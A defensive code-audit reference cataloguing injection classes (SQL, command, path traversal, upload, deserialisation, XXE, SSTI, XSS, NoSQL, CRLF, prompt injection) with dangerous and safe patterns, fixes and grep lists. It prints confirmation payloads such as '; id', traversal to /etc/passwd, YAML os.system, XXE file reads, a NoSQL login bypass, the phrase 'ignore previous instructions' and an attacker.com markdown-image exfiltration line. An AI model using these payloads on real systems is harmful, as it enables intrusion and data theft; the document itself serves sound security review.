# Injection catalogue: source → sink

User input is not a bug by itself. It becomes one when it **reaches a sink
without neutralisation appropriate to that specific sink**. The chain is always
the same: source (request, file, database, third-party API response) → a flow
with no sanitiser → sink (shell, filesystem, SQL, HTML, template engine, LLM).

Correct neutralisation depends on the **sink**, not on the source: HTML escaping
does not stop SQL injection, shell quoting does not stop path traversal. So the
question is per-sink, never a general "sanitise the input":

> **Parameterisation/allowlist, or concatenation/denylist filtering?**

A denylist (a regex for `../`, a block on `<script>`, a keyword filter on a
domain) is almost always bypassable — see the bypasses under each class below.
An allowlist or a structural API (prepared statement, `execFile` with an
argument list, canonical path + prefix check) has no bypass by construction.

## 1. SQL injection

The oldest class on the list and still the one most often reintroduced, because
an ORM in the dependency list reads as protection while the one raw query in the
reporting endpoint is where the bug lives.

**Where to look:** any query built by string concatenation, f-string, `%`,
`.format()`, or template literal; ORM escape hatches (`raw`, `extra`,
`literal`, `text`, `queryRaw`, `session.execute`); dynamic `ORDER BY`/table
names; search, filter, export and admin endpoints, which usually predate the
ORM discipline of the rest of the codebase.

| Language / layer | Dangerous | Safe |
|---|---|---|
| Python DB-API | `cur.execute(f"... {x}")`, `%` formatting | `cur.execute("... %s", (x,))` — parameters as the second argument |
| SQLAlchemy | `text(f"...{x}")`, `.filter(text(...))` | `text("... :x")` + `.bindparams(x=x)` |
| Django | `.extra(where=[...])`, `.raw(f"...")` | ORM lookups, `.raw("... %s", [x])` |
| Node (pg/mysql) | `` query(`... ${x}`) `` | `query("... $1", [x])` / `?` placeholders |
| Prisma / Knex | `$queryRawUnsafe`, `knex.raw("..." + x)` | `$queryRaw` tagged template, `knex.raw("?", [x])` |
| Java | `Statement` + concatenation | `PreparedStatement` with `?` |
| PHP | `mysqli_query("... $x")` | PDO prepared statements |

Patterns reviewers miss:

- **Identifiers cannot be parameterised.** Placeholders bind *values*, not table
  or column names. A dynamic `ORDER BY {user_input}` or `SELECT * FROM {table}`
  therefore has to be an **allowlist mapping** from an input token to a literal
  identifier — quoting it is not enough.
- **`LIMIT`/`OFFSET` built by formatting** — often assumed safe "because it is a
  number". Safe only if the cast to `int` happens *before* the formatting and
  cannot throw into a fallback that passes the raw string through.
- **Second-order injection.** The value is stored safely through a parameterised
  insert, then read back and concatenated into a second query. The dangerous
  query has no user input visible next to it — the source is the database.
- **Batch execution.** `executescript`, `multi=True`, or a driver with multiple
  statements enabled turns any injection into stacked queries (`; DROP TABLE`).
- **`LIKE` with user-controlled wildcards** — not injection, but `%` in a search
  term can turn an indexed lookup into a full scan; that belongs to
  `availability.md`, and is worth noting when you see it.
- **Migrations and maintenance scripts.** They usually predate review, run as a
  superuser, and take input from a config file or CLI argument — see the
  measurement in SKILL.md Step 2 on non-HTTP entry points.

**How to confirm:** call the real query function with a payload that changes the
result set rather than one that breaks syntax — `' OR '1'='1`, `1 OR 1=1`, or a
`UNION SELECT` matching the column count — and show the returned rows differ.
Control group: the same payload against a parameterised version of the same
query must return zero rows (or the literal string as data). A driver error
message alone is a *hint*, not proof; boolean or time-based differential
(`AND SLEEP(5)`) is proof when the error is suppressed.

**Correct fix:** parameterised queries everywhere, an allowlist map for dynamic
identifiers, a database account with only the privileges the endpoint needs.
Escaping functions are a fallback for legacy code, not the primary defence.

## 2. Command injection

**Where to look:** any call that spawns a shell process with data from a
request, file, filename, or header.

| Language | Dangerous | Safe |
|---|---|---|
| Python | `subprocess.run(cmd, shell=True)`, `os.system(f"...{x}")`, `os.popen` | `subprocess.run([bin, arg1, arg2], shell=False)` |
| Node | `child_process.exec(cmd)`, `` `cmd ${x}` `` | `execFile(bin, [arg1, arg2])` / `spawn` without a shell |
| Ruby | `` `cmd #{x}` ``, `system("sh -c ...")`, `%x{}` | `system(bin, arg1, arg2)` (array form) |
| PHP | `shell_exec`, `system`, `` `cmd` `` with concatenation | `escapeshellarg` — and still prefer no shell |

Patterns often missed in review:

- **Argument injection** — no shell metacharacters required. If input lands as an
  *argument* in `execFile(bin, [userInput])` and `userInput` starts with `-`, it
  may be parsed as a flag rather than a value: `--output=/etc/passwd`,
  `-oProxyCommand=...` for `ssh`/`scp`/`rsync`, `--upload-pack` for `git`.
  Fix: `--` before user arguments (`[bin, '--', userInput]`), or an explicit
  check that the value does not start with `-`.
- **Binary path from the environment** — `PATH`, an environment variable, or a
  relative path under attacker control (an uploaded file in the cwd) substitutes
  the program being run. Trace where `bin`/`cmd[0]` comes from.
- Backtick / `$()` / `;` / `|` / `&&` inside `shell=True` — the classic, worth
  checking precisely because it is easy to skim past when the input "is just a
  filename".

**How to confirm:** a reproducing run against the real function or endpoint with
`; id`, `$(id)`, or `--help` (for argument injection), showing a foreign process
executing or the binary's behaviour changing.

**Correct fix:** an argument list with no shell interpretation
(`shell=False`/`execFile`), `--` before user values, an allowlist of permitted
binaries and subcommands. String escaping is the last line, not the main one.

## 3. Path traversal

**Where to look:** `open(base + user_input)`, `fs.readFile(path.join(base, x))`,
upload/download by name or id from the request, archive extraction.

Bypasses that an `if ".." in path` filter lets through:

- **URL encoding / double encoding** — `%2e%2e%2f`, `%252e%252e%252f` (decoded
  twice by proxy plus application).
- **Absolute path** — `/etc/passwd` ignores `base` entirely: Python's
  `os.path.join` with an absolute second argument **discards** `base`.
- **Null byte** — `file.txt\x00.jpg` truncates the extension in older runtimes
  and C-binding libraries, defeating a suffix check.
- **Windows separators** — `..\\..\\`, mixed `/` and `\`, `8.3` short names
  (`PROGRA~1`) against filters that only look for `/`.
- **Symlinks** — a file inside the permitted directory is a symlink pointing
  out of it; a string check never catches this, only filesystem resolution
  (`realpath`).
- **Zip slip** — an archive entry named `../../etc/cron.d/x`; an extractor that
  does not re-check each entry's path after joining it to the target directory
  writes anywhere.

**How to confirm:** run `../../../etc/passwd`, `..%2f..%2fetc%2fpasswd`, an
absolute path, and (where applicable) an archive with a traversal entry through
the real read/write/extract function, and show content from outside `base`.

**Correct fix:** `os.path.realpath()`/`path.resolve()` to a canonical absolute
path, then check it **starts with** the canonical `base` (plus `os.sep`, so that
`/base-evil` does not pass as a prefix of `/base`). Filtering the substring `..`
is not a fix — encoding and absolute paths get past it.

## 4. File upload

**Where to look:** the multipart/upload endpoint and everything that happens to
the file afterwards (storing, serving, image processing).

| Check | Why it is not enough |
|---|---|
| Filename extension (`.jpg`, `.pdf`) | Renaming a file is trivial |
| `Content-Type` from the client | The client sends any header it likes; this inspects nothing |
| Magic-byte check (the real fix) | Requires reading the leading bytes and matching the format signature |

Concrete holes:

- **Client filename used directly as the storage path** — `../` in the name (see
  §3), or simply overwriting an existing file with the same name (a race, or
  clobbering someone else's upload). Generate the name server-side (UUID); keep
  the original only as metadata.
- **Storing into a directory the web server serves** (`/public/uploads`,
  `/static`) without disabling execution → an uploaded `.php`/`.jsp`/`.asp` runs
  as code if the server is configured to execute scripts there. Check whether the
  directory is served directly and whether `execute` is enabled for it.
- **Polyglots** — a file valid both as a permitted format (GIF/JPEG) and as
  HTML/JS (GIFAR-style, a JPEG with a payload after EXIF). If the server sets
  `Content-Type` from the extension and the browser sniffs content, it loads as
  HTML → stored XSS. Fix: `Content-Disposition: attachment` and/or a separate
  cookieless domain for user content, plus `X-Content-Type-Options: nosniff`.
- **SVG with `<script>` / `onload`** — SVG is XML, allowed as "an image", but
  rendered as a document when opened directly (not via `<img>`). Check whether
  SVG is sanitised (strip `<script>`, `on*` attributes, external `xlink:href`)
  before it is served.
- **Processing by a vulnerable library** — ImageMagick (`convert`, `MSL`/`MVG`
  payload → RCE, the "ImageTragick" class), libvips, PDF renderers. Check the
  library version and its CVEs, not only that magic bytes are validated.

**How to confirm:** upload a file with a mismatched extension/type and show the
magic-byte check is absent or bypassable; for zip slip and polyglots, show the
resulting write path or the `Content-Type` used when serving.

**Correct fix:** content inspection (magic bytes, or decoding as the declared
format), server-generated names, user content served from a separate domain with
script execution off, `Content-Disposition: attachment`, SVG sanitised or refused.

## 5. Unsafe deserialisation

**Where to look:** any point where serialised data arrives **from outside** (request
body, cookie, cache, queue) and is turned back into an object.

| Pattern | Risk |
|---|---|
| `pickle.loads(x)` on external data | Arbitrary code execution during deserialisation (Python pickle runs `__reduce__`) |
| `yaml.load(x)` without `Loader=yaml.SafeLoader` | The full loader instantiates arbitrary Python objects (`!!python/object/apply`) |
| `marshal.loads` | As pickle, and even less intended for untrusted data |
| Java `ObjectInputStream.readObject()` on external data | The classic gadget-chain RCE (Apache Commons Collections and friends) |
| `JSON.parse(x, reviver)` with a reviver that trusts keys | A reviver executing logic keyed on object keys is a vector when keys are unvalidated |
| Deep merge / `Object.assign` with keys from JSON | **Prototype pollution**: `{"__proto__": {"isAdmin": true}}` mutates `Object`'s prototype globally |
| `eval()` / `new Function(x)` / `vm.runInNewContext` on user data | Direct code execution |

**How to confirm:**
- pickle/marshal: serialise a payload whose `__reduce__` runs something harmless
  but observable (`touch /tmp/poc`), feed it to the real `loads`, show the effect.
- YAML: `!!python/object/apply:os.system ["id"]` through `yaml.load`.
- Prototype pollution: send `{"__proto__":{"polluted":"yes"}}` to a body that
  passes through the merge function, then show `{}.polluted === "yes"` on a
  fresh object afterwards — global prototype contamination.

**Correct fix:** do not deserialise untrusted data with formats that execute code
(pickle/marshal/Java native serialisation) — use JSON/protobuf with a strict
schema. YAML only through `SafeLoader`. For merges, reject `__proto__`/
`constructor`/`prototype` keys, or use `Object.create(null)` plus
`structuredClone` or a library that guards against it (not old `lodash.merge`).

## 6. XXE and XML parsing

XML is not just an API format: it hides inside SVG, DOCX/XLSX/ODF, SOAP, RSS,
SAML assertions, sitemaps and configuration files. Any of those reaching a parser
with external entities enabled is the same bug.

**The mechanism:** a document declares an entity pointing at a local file or a
URL, and the parser dereferences it while parsing — before your code sees any of
it. That yields file read (`file:///etc/passwd`), SSRF from the server's network
position (`http://169.254.169.254/...` — cross-reference `ssrf-bypasses.md`), and
denial of service.

| Stack | Dangerous | Safe |
|---|---|---|
| Python | `lxml.etree.parse` with a default parser, `xml.dom.minidom`, `xml.sax` | `defusedxml`, or `etree.XMLParser(resolve_entities=False, no_network=True)` |
| Java | `DocumentBuilderFactory` / `SAXParserFactory` at defaults | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` |
| PHP | `libxml_disable_entity_loader(false)`, old libxml | Keep entity loading off; parse with `LIBXML_NONET` |
| Node | `libxmljs` with `noent: true`, some `xml2js` configurations | Leave entity expansion off; prefer a parser without DTD support |
| .NET | `XmlDocument` with a non-null `XmlResolver` | `XmlResolver = null`, `DtdProcessing.Prohibit` |

Related failures in the same place:

- **Billion laughs / quadratic blowup** — nested entity expansion turning a few
  kilobytes into gigabytes of memory. This is a DoS, not a read; see
  `availability.md` for severity.
- **XInclude** — file inclusion even where DTD processing is off, if XInclude is
  enabled separately.
- **XSLT from user input** — a transform is a program; treat it like SSTI (§7).
- **SAML and signature wrapping** — signed XML where the parser and the signature
  verifier disagree about which element is authoritative. If the project verifies
  SAML or XML signatures by hand, that is a finding in itself; use a library.

```
grep -rnE "etree\.(parse|fromstring)|minidom|xml\.sax|DocumentBuilderFactory|SAXParser|libxmljs|XmlDocument|resolve_entities|noent"
```

**How to confirm:** parse a document declaring
`<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/hostname">]>` and referencing `&e;`
through the project's real parsing function, and show the file contents in the
parsed output — or, for blind cases, an outbound request to a host you control.
Control group: the same document through `defusedxml` (or the hardened parser
config) must raise or return the entity unexpanded.

**Correct fix:** disable DTDs and external entities at the parser, prefer a
hardened library (`defusedxml` and equivalents), and cap document size and
expansion depth.

## 7. SSTI (Server-Side Template Injection)

Not to be confused with ordinary XSS: here the input lands not in the template's
**data** (`{{ user_input }}` as a variable value is fine) but **in the template
source**, which is then compiled and executed.

**The tell in code:** `render_template_string(user_input)`,
`Template(user_input).render()`, `Twig::createTemplate(userInput)`,
`Handlebars.compile(userInput)`, or string concatenation into an f-string or
template literal that is then handed to the renderer rather than to the context.

| Engine | Confirming payload | Safe vs vulnerable response |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` | literal `{{7*7}}` vs `49` |
| Twig (PHP) | `{{7*7}}` | same |
| Freemarker (Java) | `${7*7}` | same |
| Handlebars (JS) | `{{#with "constructor"}}...{{/with}}` | error/literal vs execution |
| ERB (Ruby) | `<%= 7*7 %>` | same |

**How to confirm:** send `{{7*7}}` (or the engine's equivalent) into a field that
the code routes into the engine as template *source*, not as a context variable.
`49` in the response means the engine executed the input as template code.
Escalation to RCE is engine-specific — go only as far as confirmation, do not
run a full exploitation chain.

**Correct fix:** user data only in the render **context**
(`render_template('page.html', name=user_input)`), never in template source. If
user-authored templates are a genuine feature (an email builder, say), use a
sandboxed environment (Jinja2 `SandboxedEnvironment`, with caveats) or a
restricted mini-language with no access to the language object model.

## 8. XSS in full

Three kinds by source: **reflected** (input from the current request echoed into
the response), **stored** (input persisted and served to other users), and
**DOM-based** (source and sink both in the browser, the server not involved —
`location.hash` → `innerHTML`, routinely missed by server-side scanners).

**JS sinks (DOM-based; look in client code):**

| Sink | Risk |
|---|---|
| `.innerHTML`, `.outerHTML` | Inserting an unchecked string executes `<script>` and handlers |
| `document.write(x)` | The same, and it rewrites the document |
| `.insertAdjacentHTML(pos, x)` | The same |
| `eval(x)`, `new Function(x)`, `setTimeout(x, t)` with a string | Arbitrary JS execution |
| `location = x`, `location.href = x`, `<a href="javascript:...">` | `javascript:` URI from user data |
| `element.srcdoc = x` | An iframe with arbitrary HTML/JS |

**Frameworks whose built-in protection has been switched off:**

- React `dangerouslySetInnerHTML={{__html: x}}` — the name says it; grep for it
  literally.
- Vue `v-html="x"`.
- Angular `bypassSecurityTrustHtml`/`bypassSecurityTrustScript`/
  `bypassSecurityTrustUrl` — an explicit bypass of Angular's sanitiser.
- Server templates with auto-escaping off: Jinja2/Django `|safe`, `Markup(x)`;
  Handlebars triple braces `{{{ x }}}` (double braces escape, triple do not).

**JSON embedded in `<script>`:** `<script>var data = {{ json_data }};</script>` —
if `json_data` contains `</script>`, it closes the tag and switches to HTML
context (`</script><script>alert(1)</script>`). Fix: escape `<` as `<`
inside the JSON string before embedding.

**How to confirm:** a payload such as `<img src=x onerror=alert(document.domain)>`
(reflected/stored), or `#<img src=x onerror=...>` for a DOM sink fed from
`location.hash`; show it executing (alert/console), not merely that the string is
reflected — reflection without execution is not XSS.

**CSP is a second line, not a replacement for escaping.** A good CSP
(`script-src 'self'` with no `'unsafe-inline'`/`'unsafe-eval'`, no wildcard
hosts) reduces impact, but missing escaping is a bug in itself, and a weak CSP
(`unsafe-inline` is nearly always there "for compatibility") does not compensate.
Check CSP as its own item, not instead of the sink fix.

**Correct fix:** context-aware escaping on output (not on input) through the
framework — React/Vue escape `{}`/`{{ }}` by default, so the hole is wherever
that was deliberately bypassed — `textContent` instead of `innerHTML`, and a
sanitiser such as DOMPurify where user HTML genuinely has to be rendered.

## 9. NoSQL injection

**Where to look:** MongoDB and equivalents, where an object from the request body
or query string reaches a filter without a type cast.

- **Operator injection through a JSON body** — `{"password": {"$ne": null}}`
  instead of a password string defeats `db.users.find({username, password})` if
  `password` is not cast to a string first: `$ne`/`$gt`/`$in` as a field value
  change the query's meaning from "equals this password" to "does not equal".
- **`$regex` as a ReDoS vector** — `{"field": {"$regex": "(a+)+$"}}` from a client
  burns CPU in the server's regex engine.
- **`$where` with arbitrary JS** — `{"$where": "this.a == this.b"}` executes
  JavaScript **on the database server**. MongoDB's documentation does not describe
  the isolation model of that context, so treat it as code execution rather than
  "just a filter": CPU DoS and query-logic bypass at minimum. `$where` is
  deprecated as of MongoDB 8.0; server-side JS is disabled entirely with
  `security.javascriptEnabled: false` (or `--noscripting`), which is the fix.
- **Aggregation pipelines from user input** — `$lookup` and `$merge` with
  client-supplied parameters can read or write other collections.
- **A query-string parser that builds objects** — `qs`/`express` parse
  `?user[$ne]=1` into `{user: {"$ne": "1"}}` by default. An endpoint expecting a
  string gets an object: the same operator injection with a GET parameter as the
  source.

**How to confirm:** send `{"password": {"$ne": null}}` (or `?password[$ne]=1`) to
the login endpoint instead of a string and show authentication succeeding without
knowing the password.

**Correct fix:** cast types before the query (`String(input.password)`), schema
validation on the body (zod/joi/mongoose with `strict`), reject `$`/`.` keys in
user input (`mongo-sanitize` or equivalent), and never build `$where` from user
strings.

## 10. Header injection / CRLF

**Where to look:** response header values, `Location` on redirect, email fields,
log lines — anywhere a user string is inserted without a `\r\n` check.

- **CRLF in a header value → response splitting** — `\r\n` inside a value the
  server writes into an HTTP header terminates it and allows injecting further
  headers or a response body. Modern HTTP libraries often block `\r\n` in
  `setHeader` — verify that, do not assume it.
- **`Set-Cookie` injection** — the same vector, adding or modifying cookies
  through a controlled value that reaches the `Set-Cookie` line.
- **Open redirect / `Location` from user input** — `?next=`, `?returnUrl=` placed
  straight into `Location:` with no check that it is a relative path or an
  allowlisted domain; used for phishing and to escalate other bugs (OAuth
  `redirect_uri`).
- **Email header injection** — a subject or sender-name field carrying
  `\r\nBcc: victim@x` when it goes straight into the message headers (the PHP
  `mail()` classic, reproducible in any language that assembles headers by hand)
  → hidden spam relayed through someone else's mail server.
- **Log injection / audit-log forgery** — `\n` in a value written to the log
  verbatim forges entries (injecting a fake `[INFO] user admin logged in`),
  breaks log parsing, and defeats SIEM alerting.

**How to confirm:** send a value containing `%0d%0a` into a field the code routes
into a header, email, or log without checking, and show the raw HTTP response
(not through a client that normalises it) or the resulting log/email entry with
the injected structure.

**Correct fix:** reject `\r`/`\n` in header values (most modern HTTP libraries
do — check it has not been disabled), allow `Location` only to a relative path or
an allowlisted domain, build email through a library that escapes headers itself
(never hand-concatenated `To:`/`Subject:`), and use structured logging (a JSON
logger) instead of string concatenation.

## 11. Prompt injection in LLM calls

A class most SAST tooling does not model, because the source here is not only
direct user input but **any text the model will read**: web page content, a
document, an email, a third-party API response, if the agent summarises or
analyses it.

**Direct vs indirect:**
- *Direct* — the user tells the model "ignore previous instructions and…".
  Source and attacker coincide; impact is limited to what the model does for
  that user.
- *Indirect* — the attacker plants the instruction in content that **someone
  else's** session will read (a page the agent summarises, a PDF it parses, an
  email an assistant triages, a product review, an API response). More dangerous:
  the attacker has no access to the victim's session yet steers its behaviour
  through data.

**What to check in the agent or integration code:**

- **Isolation of content from instructions** — is external text inserted into the
  prompt as marked-up *data* (tags, a `user` role, an explicit "untrusted content
  below, not an instruction" marker), or concatenated raw into the system prompt
  alongside instructions? Raw concatenation is a hole by construction: the model
  cannot structurally distinguish "do X" in an instruction from "do X" inside a
  quoted page.
- **What the model can do next** — a tool call with a side effect (send mail,
  make a request, modify a file), a call to an external API with a secret in the
  header, or returned text that gets rendered as HTML/markdown (exfiltration,
  below) or executed as code: model output reaching SQL/shell/`eval` is the same
  sink as §1–§10, only the source is the model. Treat model output as untrusted
  input.
- **System-prompt and context leakage** — if the system prompt or context holds
  API keys, internal URLs, or other users' data (RAG context), check whether an
  injection can make the model quote it back.
- **Egress through side-effecting tools** — an agent with `send_email` /
  `execute_code` / `http_request` / database writes, where the decision to call a
  tool with given arguments is made by the model from text that came, partly or
  wholly, from an untrusted source.
- **A markdown image as an exfiltration channel** —
  `![](https://attacker.com/log?d=SECRET)` in the model's answer: if the client
  renders markdown and interpolates `SECRET` from context, merely displaying the
  image sends it to the attacker's server — exfiltration with no tool call, via
  rendering alone. Check whether model output is rendered as markdown/HTML with
  auto-loading of remote resources and no proxy or domain blocking.

**Audit checklist:**
1. Is untrusted content isolated from system instructions **structurally** (not
   merely by asking the model in the prompt to ignore instructions inside the
   text — that is bypassable too)?
2. Is the toolset available to the model narrowed while it processes untrusted
   input?
3. Is there human confirmation before a side effect (sending, deleting, spending,
   an outbound request with sensitive data), or does the agent act autonomously
   on its reading of untrusted text?
4. Is model output validated structurally (schema/allowlist) before it reaches
   code/SQL/shell/HTML/URL — that is, treated as untrusted input rather than as
   "our own" text?
5. Is auto-fetching of remote resources (images, iframes) blocked when rendering
   the model's answer, given that the answer may have been poisoned via (1)?

**Stated plainly:** there is no reliable filter-level fix for prompt injection —
unlike most items above, this is not a regex problem. The real defence is
**limiting the model's authority** (which tools are reachable, which data is
visible, what requires human confirmation), not trying to tell a "good"
instruction from a "bad" one inside text. Audit the blast radius of a successful
injection, not the odds of a filter catching it.

## 12. Missing schema validation at the boundary

Not a sink of its own but the systemic cause of much of the above: a handler
takes `req.body`/`req.query` directly (an unchecked object/dict) and passes it
onward — into a query builder, a merge, business logic. Consequences:

- A field of an unexpected type (an object where a string was assumed) reaches a
  sink that assumed a string — see §9, where `password` is suddenly `{$ne: null}`.
- Extra fields the handler never expected pass through to a layer that uses them
  unasked — **mass assignment / BOPLA**, covered in `SKILL.md` (privilege
  escalation through extra body fields); see the main skill file rather than a
  duplicate here.

**The check:** is there an explicit schema at the input boundary (immediately
after body parsing, before business logic) — zod/pydantic/joi/express-validator/
class-validator with `strict`/`additionalProperties: false` — or does the code
read fields off a raw object as needed, implicitly trusting the shape of input?

## Summary: sink → grep → fix

| Sink | Grep for | Correct fix |
|---|---|---|
| SQL injection | `execute(f"`, `execute("... " +`, `.format(`, `` query(`...${ ``, `queryRawUnsafe`, `knex.raw`, `.extra(`, `text(f"` | prepared statements with bound parameters; allowlist map for dynamic identifiers; least-privilege DB account |
| Command injection | `shell=True`, `os.system(`, `exec(`, `child_process.exec(`, `` `sh -c` `` | argument list without a shell, `--` before user arguments, allowlist of binaries |
| Path traversal | `os.path.join(.*request`, `path.join(.*req\.`, `fs.readFile(.*req\.`, `send_file(`, `zipfile.extractall(` | `realpath`/`resolve` plus canonical prefix check |
| File upload | `request.files`, `multer(`, `.filename`, `Content-Type.*request` | magic-byte validation, server-side filename, serving from a non-executing separate domain |
| Deserialisation | `pickle.loads(`, `yaml.load(` without `SafeLoader`, `marshal.loads(`, `ObjectInputStream`, `Object.assign(.*req\.body` | JSON+schema instead of pickle/marshal, `yaml.safe_load`, reject `__proto__`/`constructor` on merge |
| XXE / XML | `etree.parse`, `minidom`, `xml.sax`, `DocumentBuilderFactory`, `libxmljs`, `resolve_entities`, `noent` | disable DTDs and external entities, use `defusedxml` or a hardened parser, cap size and expansion |
| SSTI | `render_template_string(`, `Template(.*request`, `\.compile\(req\.`, `createTemplate(` | user input only in the render context, never in template source |
| XSS | `dangerouslySetInnerHTML`, `v-html`, `innerHTML\s*=`, `document\.write(`, `\|safe`, `bypassSecurityTrust`, `{{{` | framework context-aware auto-escaping, `textContent`, DOMPurify when HTML is genuinely required |
| NoSQL injection | `req.body` straight into `.find(`/`.findOne(`, `$where`, `$regex.*req\.` | type casting plus schema validation, reject operator keys in input |
| Header/CRLF injection | `res.setHeader(.*req\.`, `Location.*req\.query`, `mail(.*\$_`, `logger\.(info\|warn)\(.*req\.` | reject `\r\n` in values, allowlist redirect domains, structured logging |
| Prompt injection | external text (fetch/file/email) concatenated into a system prompt; a tool called on the result of parsing such text | isolate data from instructions, narrow the toolset, confirm before side effects, validate model output as untrusted |
| Missing schema validation | a route handler with no `zod.parse`/`pydantic`/`joi.validate` before using `req.body`/`req.query` | strict schema at the boundary, drop unknown fields (see BOPLA in SKILL.md) |
